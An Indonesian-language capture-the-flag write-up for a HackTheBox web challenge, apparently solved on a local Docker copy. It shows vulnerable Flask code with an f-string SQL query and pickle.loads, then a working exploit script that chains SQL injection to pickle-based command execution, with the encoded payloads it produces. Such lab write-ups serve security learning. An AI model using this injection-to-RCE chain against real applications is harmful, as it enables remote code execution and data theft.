# C.O.P (Cult of Pickle)

```bash
Target	= 167.99.85.216
Port	= 31569
```

Jika kita buka, akan muncul website onile shop merch. Setelah saya coba klik sana sini, ternyata, ketika kita pergi ke halaman salah satu produk, kita dapat berpindah ke halaman produk lain dengan produk id
```
http://Target:Port/view/1
................../view/2
................../view/..
................../view/5
```
Jika kita memasukkan id > 4, maka kita akan mendapat response 5xx, yang mana mengindikasikan tidak ada produk dengan id tersebut. Hal ini menunjukkan potensi SQL Injection. Selanjutnya saya mencoba untuk melihat source code di file yang telah saya download. Ternyata saya menemukan bahwa web ini menggunakan python sebagai back-end, selain itu saya mendapat beberapa file. Disini saya menggunakan Docker untuk deploy web challange di local.
```bash
sudo service docker start
sudo ./build_docker.sh
...
...
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:1337
...
```
Selanjutnya kita lihat beberapa file yang menarik di web app
```python
# web_cop/challenge/application/app.py

from flask import Flask, g
from application.blueprints.routes import web
import pickle, base64

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')

@app.template_filter('pickle')
def pickle_loads(s):
        return pickle.loads(base64.b64decode(s))

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()
```

```python
# web_cop/challenge/application/database.py

from flask import g
from application import app
from sqlite3 import dbapi2 as sqlite3
import base64, pickle

def connect_db():
    return sqlite3.connect('cop.db', isolation_level=None)
    
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = connect_db()
        db.row_factory = sqlite3.Row
    return db

def query_db(query, args=(), one=False):
    with app.app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], value) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (next(iter(rv[0].values())) if rv else None) if one else rv

class Item:
	def __init__(self, name, description, price, image):
		self.name = name
		self.description = description
		self.image = image
		self.price = price

def migrate_db():
    items = [
        Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg'),
        Item('Pickle Shirt 2', 'Get our (second) new pickle shirt!', '27', '/static/images/pickle_shirt2.jpg'),
        Item('Dill Pickle Jar', 'Literally just a pickle', '1337', '/static/images/pickle.jpg'),
        Item('Branston Pickle', 'Does this even fit on our store?!?!', '7.30', '/static/images/branston_pickle.jpg')
    ]
    
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```

```python
# web_cop/challenge/application/models.py

from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')
```

Dari beberapa file tersebut kita mendapat informasi bahwa:
- web ini menggunakan python flask
- web ini menggunakan sqlite
- web ini menggunakan library `pickle` di python

Library `pickle` di python memungkinkan kita untuk melakukan serialize dan deserialize data. Dalam docs dari [pickle](https://docs.python.org/3/library/pickle.html), terdapat peringatan `Warning The pickle module is not secure. Only unpickle data you trust.`. Hal ini karena `pickle` memungkinkan kita mengubah python object ke urutan byte dan mengubahnya kembali ke python object. Kita akan melakukan exploit di `pickle` ini. Untuk penjelasan lengkap dan mendetail tentang exploit, kamu bisa baca di [artikel berikut](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). Disini saya menggunakan exploit yang ada di [artikel](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) untuk mendapatkan flag. Berikut adalah exploitnya
```python
# exploit.py

import pickle
import base64
import os
import urllib.parse as url_encode

class Exploit:
    def __reduce__(self):
        cmd = ('touch heheheheheh.txt')
        return os.system, (cmd,)

def pickling():
    pickled = pickle.dumps(Exploit())
    payload = base64.urlsafe_b64encode(pickled).decode('ascii')
    return payload

def convert_to_url(x):
    sql_cmd = f"' UNION SELECT '{x}"
    encoding = url_encode.quote(sql_cmd)
    return encoding


if __name__ == '__main__':
    x = pickling()
    print(convert_to_url(x))
```
Selanjutnya kita run
```bash
python3 exploit.py
..
%27%20UNION%20SELECT%20%27gASVLwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBR0b3VjaCBoZWhlaGVoZWhlLnR4dJSFlFKULg%3D%3D
```
Jika kita passing payload tersebut ke `http://127.0.0.0:1337/view/<payload>` maka web akan memberikan tampilan website yang rusak. Hal ini menjadi pertanda baik. Selanjutnya kita bisa mendapatkan flag dengan cara copy file `flag.txt` ke public direktori yang ada di website, dalam hal ini adalah `../static/..`, jadi ubah cmd pada script menjadi
```python
...
class Exploit:
    def __reduce__(self):
        cmd = ('cp flag.txt application/static/.')
        return os.system, (cmd,)
...
```
Selanjutnya, kita dapat run script exploit sekali lagi
```bash
python3 exploit.py
..
%27%20UNION%20SELECT%20%27gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg%3D%3D
```
dan kita dapat gunakan payload tersebut ke link `http://127.0.0.1:1337/view/<payload>`. Selanjutnya kita dapat akses public dir nya untuk mebaca isi flag dengan curl
```bash
curl http://127.0.0.1:1337/static/flag.txt
HTB{f4k3_fl4gs_f0r_t3st1ng}
```
dan berhasil, kita dapat langsung menggunkan payload tersebut ke web target.
